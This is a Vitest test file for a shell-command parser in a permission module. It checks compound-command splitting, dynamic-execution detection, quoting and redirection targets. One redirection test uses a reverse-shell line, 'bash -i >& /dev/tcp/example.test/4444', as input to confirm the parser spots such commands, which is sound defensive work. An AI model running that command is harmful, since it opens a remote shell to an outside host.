import { describe, expect, it } from "vitest";
import { parseShellCommand, shellWords } from "../shell/permission/shell-parser";

describe("shell parser", () => {
  it("splits compound commands without splitting quoted operators", () => {
    expect(parseShellCommand("echo 'a|b' && git status | tail -1").segments).toEqual([
      "echo 'a|b'",
      "git status",
      "tail -1",
    ]);
  });

  it("detects dynamic execution and malformed quotes", () => {
    expect(parseShellCommand("echo $(whoami)").hasDynamicExecution).toBe(true);
    expect(parseShellCommand("echo 'open").malformed).toBe(true);
  });

  it("extracts shell words while honoring quotes", () => {
    expect(shellWords("git commit -m 'hello world'")).toEqual([
      "git",
      "commit",
      "-m",
      "hello world",
    ]);
  });

  it("extracts actual redirection targets without treating inert text as a target", () => {
    expect(parseShellCommand('echo "/etc/passwd" > "notes file.txt"').redirections).toEqual([
      { operator: ">", target: "notes file.txt" },
    ]);
    expect(parseShellCommand("bash -i >& /dev/tcp/example.test/4444").redirections).toEqual([
      { operator: ">&", target: "/dev/tcp/example.test/4444" },
    ]);
  });
});
